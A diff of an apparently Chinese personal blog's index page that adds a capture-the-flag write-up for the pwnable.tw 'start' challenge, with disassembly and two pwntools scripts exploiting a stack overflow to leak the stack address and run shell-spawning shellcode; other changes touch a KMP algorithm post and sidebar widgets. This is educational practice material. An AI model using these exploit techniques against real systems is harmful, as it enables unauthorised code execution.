@@ -114,6 +114,120 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/03/20/Writeup-of-pwnable-tw之start/" >Writeup of pwnable.tw之start</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-03-20  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+
+	
+
+	</div>
+  <a type="button" href="/2020/03/20/Writeup-of-pwnable-tw之start/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>题目地址：pwable.tw</p>
+<p>使用checksec查看开启了哪些防护措施：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用objdump -d进行反汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:    54                       push   %esp</span><br><span class="line"> 8048061:    68 9d 80 04 08           push   $0x804809d</span><br><span class="line"> 8048066:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 8048068:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 804806a:    31 c9                    xor    %ecx,%ecx</span><br><span class="line"> 804806c:    31 d2                    xor    %edx,%edx</span><br><span class="line"> 804806e:    68 43 54 46 3a           push   $0x3a465443</span><br><span class="line"> 8048073:    68 74 68 65 20           push   $0x20656874</span><br><span class="line"> 8048078:    68 61 72 74 20           push   $0x20747261</span><br><span class="line"> 804807d:    68 73 20 73 74           push   $0x74732073</span><br><span class="line"> 8048082:    68 4c 65 74 27           push   $0x2774654c //将要显示的字符串压栈</span><br><span class="line"> 8048087:    89 e1                    mov    %esp,%ecx</span><br><span class="line"> 8048089:    b2 14                    mov    $0x14,%dl</span><br><span class="line"> 804808b:    b3 01                    mov    $0x1,%bl</span><br><span class="line"> 804808d:    b0 04                    mov    $0x4,%al</span><br><span class="line"> 804808f:    cd 80                    int    $0x80</span><br><span class="line"> 8048091:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 8048093:    b2 3c                    mov    $0x3c,%dl</span><br><span class="line"> 8048095:    b0 03                    mov    $0x3,%al</span><br><span class="line"> 8048097:    cd 80                    int    $0x80</span><br><span class="line"> 8048099:    83 c4 14                 add    $0x14,%esp</span><br><span class="line"> 804809c:    c3                       ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:    5c                       pop    %esp</span><br><span class="line"> 804809e:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 80480a0:    40                       inc    %eax</span><br><span class="line"> 80480a1:    cd 80                    int    $0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p>
+<p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p>
+<p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p>
+<p> 8048060:    54                       push   %esp</p>
+<p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p>
+<p>具体思路如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)                  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       jmp esp&#x27;&#x27;&#x27;</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或这样：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       ret&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span>-<span class="number">0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2020/03/20/Writeup-of-pwnable-tw之start/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/03/16/模式匹配算法/" >模式匹配算法</a>
 		</h3>
 		</div>
@@ -175,7 +289,7 @@
 
 <h2 id="二、KMP模式匹配算法"><a href="#二、KMP模式匹配算法" class="headerlink" title="二、KMP模式匹配算法"></a>二、KMP模式匹配算法</h2><p>KMP(克努特-莫里斯-普拉特)</p>
 <p>字串各个位的j值的变化定义为一个数组next:</p>
-<p><img src="/.io//KMP.png"></p>
+<p><img src="KMP.png"></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过计算返回字串T的next数组。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(string T, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>, k=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; T.<span class="built_in">length</span>()<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">-1</span> || T[i] == T[k]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">            next[i] = k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            k = next[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(string S, string T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = pos;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> next[<span class="number">255</span>];</span><br><span class="line">    <span class="built_in">get_next</span>(T, next);</span><br><span class="line">    <span class="keyword">int</span> S_len = S.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">int</span> T_len = T.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; S_len &amp;&amp; j &lt; T_len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || S[i] == T[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j &gt;= T_len)</span><br><span class="line">        <span class="keyword">return</span> i - T_len;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -235,33 +349,33 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
-		
 			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
-		
-			<li><a href="/tags/windows内核/">windows内核<span>4</span></a></li>
-		
-			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
-		
-			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
-		
-			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
-		
-			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
 		
 			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
-		
-			<li><a href="/tags/unix/">unix<span>2</span></a></li>
-		
-			<li><a href="/tags/Android/">Android<span>1</span></a></li>
-		
 			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
+		
+			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
 		
 			<li><a href="/tags/python/">python<span>2</span></a></li>
 		
+			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
+		
+			<li><a href="/tags/Android/">Android<span>1</span></a></li>
+		
 			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
+		
+			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
+		
+			<li><a href="/tags/windows内核/">windows内核<span>5</span></a></li>
+		
+			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+		
+			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
 		
 		 
 		</ul>
@@ -273,6 +387,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/09/24/Windows系统调用/" ><i class="fa fa-file-o"></i>Windows系统调用</a>
+      </li>
     
       <li>
         <a href="/2021/09/17/Windbg用法/" ><i class="fa fa-file-o"></i>Windbg用法</a>
@@ -288,10 +406,6 @@
     
       <li>
         <a href="/2021/09/02/高级IO/" ><i class="fa fa-file-o"></i>高级I/O</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/30/守护进程/" ><i class="fa fa-file-o"></i>Unix守护进程</a>
       </li>
     
   </ul>
@@ -354,3 +468,4 @@
 
 </body>
    </html>
+html>
